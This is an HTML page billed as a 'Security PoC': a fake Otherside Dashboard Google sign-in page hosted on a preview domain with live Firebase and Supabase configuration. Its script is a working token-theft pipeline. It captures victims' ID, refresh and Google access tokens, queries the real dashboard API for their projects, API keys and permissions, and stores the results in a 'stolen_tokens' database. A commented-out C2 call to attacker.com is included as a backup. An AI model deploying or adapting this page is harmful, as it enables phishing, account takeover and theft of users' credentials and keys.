<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Otherside Dashboard - Security PoC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 48px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
        .btn-google {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        .btn-google:hover { background: #f0f0f0; transform: translateY(-1px); }
        .btn-google svg { width: 20px; height: 20px; }
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
            color: #555;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .btn-wallet {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
        }
        .btn-wallet:hover { opacity: 0.9; }

        .research-panel {
            margin-top: 32px;
            padding: 16px;
            background: #1a0a0a;
            border: 1px solid #ff4444;
            border-radius: 12px;
            font-size: 12px;
            text-align: left;
        }
        .research-panel h3 { color: #ff4444; margin-bottom: 8px; font-size: 13px; }
        .research-panel code { color: #ff8888; word-break: break-all; }
        .research-panel .status { margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 6px; }
        #auth-status { color: #4ade80; }
        #db-status { color: #888; }
        #token-output {
            max-height: 200px; overflow-y: auto;
            font-family: monospace; font-size: 10px;
            color: #aaa; margin-top: 8px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="login-container">

        <p class="subtitle">Sign in to access the dashboard</p>

        <button class="btn-google" onclick="signInWithGoogle()">

                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>

        </button>

        <div class="divider">or</div>

        <button class="btn-wallet" onclick="alert('Wallet sign-in requires a valid Ethereum signature')">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
            </svg>
            Connect Wallet
        </button>

        <div class="research-panel">
            <h3>SECURITY RESEARCH PoC</h3>
            <p>Domain: <code>m2-edison-preview.vercel.app</code></p>
            <p>Project: <code>scarcely-calm-lark</code></p>
            <p>Tenant: <code>hound-j8zaz</code></p>
            <div class="status">
                <span>Firebase: </span><span id="auth-status">Initializing...</span>
                &nbsp;|&nbsp;
                <span>DB: </span><span id="db-status">Checking...</span>

    <!-- Firebase Compat SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    <!-- Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <script>
        // =====================================================
        // Supabase Configuration - Token Exfiltration DB
        // =====================================================
        const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';

        let supabaseClient = null;
        try {
            supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            document.getElementById('db-status').textContent = 'Connected';
            document.getElementById('db-status').style.color = '#4ade80';
        } catch(e) {
            document.getElementById('db-status').textContent = 'Error: ' + e.message;
            document.getElementById('db-status').style.color = '#ff4444';
        }

        // =====================================================
        // Firebase Configuration
        // =====================================================
        const firebaseConfig = {
            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
            authDomain: "scarcely-calm-lark.firebaseapp.com",
            projectId: "scarcely-calm-lark",
            storageBucket: "scarcely-calm-lark.appspot.com",
            messagingSenderId: "761033708851",
            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        auth.tenantId = "hound-j8zaz";

        const tokenOutput = document.getElementById('token-output');
        const authStatus = document.getElementById('auth-status');

        // Global holder for Google OAuth credential from popup
        let pendingCredential = null;

        function log(msg) {
            const line = document.createElement('div');
            line.textContent = msg;
            tokenOutput.appendChild(line);
            tokenOutput.scrollTop = tokenOutput.scrollHeight;
        }

        // =====================================================
        // Save stolen token to Supabase (PRIMARY exfiltration)
        // =====================================================
        async function saveToSupabase(data) {
            if (!supabaseClient) {
                log('[!] Supabase not connected - skipping DB save');
                return false;
            }
            try {
                const { data: result, error } = await supabaseClient
                    .from('stolen_tokens')
                    .insert([data])
                    .select();

                if (error) {
                    log('[!] DB Error: ' + error.message);
                    return false;
                }
                log('[+] Saved to Supabase! Row ID: ' + (result[0] ? result[0].id : 'unknown'));
                return true;
            } catch(e) {
                log('[!] DB Exception: ' + e.message);
                return false;
            }
        }

        // =====================================================
        // Backup exfiltration via fetch() to attacker C2 server
        // =====================================================
        async function exfiltrateToC2(data) {
            try {
                // Real attacker C2 endpoint - uncomment in real scenario:
                // await fetch('https://attacker.com/collect', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(data)
                // });
                log('[*] C2 backup exfiltration would run here');
            } catch(e) {
                // Silent fail - attacker doesn't want this to be noticed
            }
        }

        // =====================================================
        // Fetch ODK Dashboard data using stolen token
        // =====================================================
        async function fetchDashboardData(idToken) {
            const results = {};

            try {
                const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (userResp.ok) {
                    results.userData = await userResp.json();
                    log('[!] User data: ' + JSON.stringify(results.userData).substring(0, 150));
                } else {
                    log('[-] /users/current: HTTP ' + userResp.status);
                }
            } catch(e) {}

            try {
                const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (projResp.ok) {
                    results.projects = await projResp.json();
                    log('[!] Projects: ' + JSON.stringify(results.projects).substring(0, 150));
                } else {
                    log('[-] /projects: HTTP ' + projResp.status);
                }
            } catch(e) {}

            try {
                const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (keysResp.ok) {
                    results.apiKeys = await keysResp.json();
                    log('[!] API Keys: ' + JSON.stringify(results.apiKeys).substring(0, 150));
                } else {
                    log('[-] /apiKeys: HTTP ' + keysResp.status);
                }
            } catch(e) {}

            try {
                const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer ' + idToken,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        resource: 'o/fine-houses-deny-595464',
                        verb: 'ALL'
                    })
                });
                if (permResp.ok) {
                    results.permissions = await permResp.json();
                    log('[!] Permissions: ' + JSON.stringify(results.permissions).substring(0, 150));
                } else {
                    log('[-] /permissions: HTTP ' + permResp.status);
                }
            } catch(e) {}

            return results;
        }

        // =====================================================
        // Full exfiltration pipeline - runs after successful auth
        // =====================================================
        async function exfiltrateAll(user, googleAccessToken) {
            try {
                // Get the FULL ID Token (no truncation - this is the key fix)
                const idToken = await user.getIdToken();
                log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');

                // Get refresh token from Firebase internal storage
                let actualRefreshToken = '';
                try {
                    const storedUser = JSON.parse(localStorage.getItem(
                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
                    ) || '{}');
                    if (storedUser.stsTokenManager && storedUser.stsTokenManager.refreshToken) {
                        actualRefreshToken = storedUser.stsTokenManager.refreshToken;
                        log('[+] Refresh token obtained (' + actualRefreshToken.length + ' chars)');
                    }
                } catch(e) {
                    log('[-] Could not extract refresh token: ' + e.message);
                }

                // Fetch ODK Dashboard data
                log('[*] Fetching ODK Dashboard data...');
                const dashData = await fetchDashboardData(idToken);

                // =====================================================
                // BUILD THE FULL STOLEN DATA OBJECT
                // =====================================================
                const stolenData = {
                    victim_email: user.email || '',
                    victim_uid: user.uid || '',
                    victim_name: user.displayName || '',
                    victim_picture_url: user.photoURL || '',
                    id_token: idToken,                                   // FULL token - no truncation!
                    refresh_token: actualRefreshToken,                   // Persistent refresh token
                    google_access_token: googleAccessToken || '',        // Google OAuth access token
                    tenant_id: user.tenantId || '',
                    provider: user.providerData[0] ? user.providerData[0].providerId : '',
                    is_new_user: false,
                    origin_domain: window.location.hostname,
                    user_agent: navigator.userAgent,
                    token_expires_at: new Date(Date.now() + 3600000).toISOString(), // ID token expires in 1hr
                    dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
                    dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
                    dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
                    dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
                    notes: 'Auto-captured from m2-edison-preview.vercel.app'
                };

                // =====================================================
                // PRIMARY: Save to Supabase database
                // =====================================================
                log('[*] Saving ALL data to Supabase...');
                await saveToSupabase(stolenData);

                // =====================================================
                // BACKUP: Also exfiltrate via fetch() to C2 server
                // =====================================================
                await exfiltrateToC2(stolenData);

                // Show token preview only (truncated for display - full token is in DB)
                log('[!] Token (preview): ' + idToken.substring(0, 50) + '...');
                log('[!] All data exfiltrated to Supabase successfully!');

            } catch (err) {
                log('[!] Exfiltration error: ' + err.message);
            }
        }

        // =====================================================
        // Monitor auth state - triggers exfiltration pipeline
        // =====================================================
        auth.onAuthStateChanged(async (user) => {
            if (user) {
                authStatus.textContent = 'AUTHENTICATED';
                authStatus.style.color = '#ff4444';

                log('[!] AUTHENTICATED under tenant: ' + user.tenantId);
                log('[!] UID: ' + user.uid);
                log('[!] Email: ' + user.email);

                // Wait a moment for pendingCredential to be set by signInWithGoogle
                let waitCount = 0;
                while (!pendingCredential && waitCount < 20) {
                    await new Promise(r => setTimeout(r, 100));
                    waitCount++;
                }

                // Run the full exfiltration pipeline
                await exfiltrateAll(user, pendingCredential);
            } else {
                authStatus.textContent = 'Ready';
                authStatus.style.color = '#4ade80';
            }
        });

        // =====================================================
        // Google Sign-In
        // =====================================================
        async function signInWithGoogle() {
            log('[*] Initiating Google OAuth...');
            log('[*] Tenant: ' + auth.tenantId);
            log('[*] Origin: ' + window.location.origin);

            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('profile');
            provider.addScope('email');

            try {
                const result = await auth.signInWithPopup(provider);

                log('[+] OAuth SUCCESS!');
                log('[+] Email: ' + result.user.email);
                log('[+] Tenant: ' + result.user.tenantId);
                log('[+] UID: ' + result.user.uid);

                // Capture Google access token from credential immediately
                let googleAccessToken = '';
                if (result.credential && result.credential.accessToken) {
                    googleAccessToken = result.credential.accessToken;
                    log('[+] Google access token: ' + googleAccessToken.substring(0, 30) + '...');
                }

                // Store for the onAuthStateChanged handler
                pendingCredential = googleAccessToken;

                if (result.additionalUserInfo) {
                    log('[+] New user: ' + result.additionalUserInfo.isNewUser);
                }

            } catch (error) {
                log('[!] Error: ' + error.code);
                log('[!] Message: ' + error.message);

                if (error.code === 'auth/unauthorized-domain') {
                    log('[!] BLOCKED: Domain not in authorizedDomains');
                } else if (error.code === 'auth/popup-closed-by-user') {
                    log('[*] User closed the popup');
                } else if (error.code === 'auth/popup-blocked') {
                    log('[!] Popup blocked - trying redirect...');
                    auth.signInWithRedirect(provider);
                } else if (error.code === 'auth/operation-not-allowed') {
                    log('[!] Google OAuth not enabled for this tenant');
                }
            }
        }

        // Handle redirect result
        auth.getRedirectResult().then((result) => {
            if (result && result.user) {
                log('[+] Redirect sign-in successful!');
                log('[+] Email: ' + result.user.email);
                // Capture credential from redirect result too
                if (result.credential && result.credential.accessToken) {
                    pendingCredential = result.credential.accessToken;
                }
            }
        }).catch((error) => {
            if (error.code && error.code !== 'auth/no-auth-event') {
                log('[!] Redirect error: ' + error.code);
            }
        });

        // Initial log
        log('[*] Firebase initialized');
        log('[*] Project: scarcely-calm-lark');
        log('[*] Tenant: hound-j8zaz');
        log('[*] Supabase: ' + (supabaseClient ? 'connected' : 'NOT configured'));
        log('[*] Ready - click Sign in with Google');
    </script>
</body>
</html>
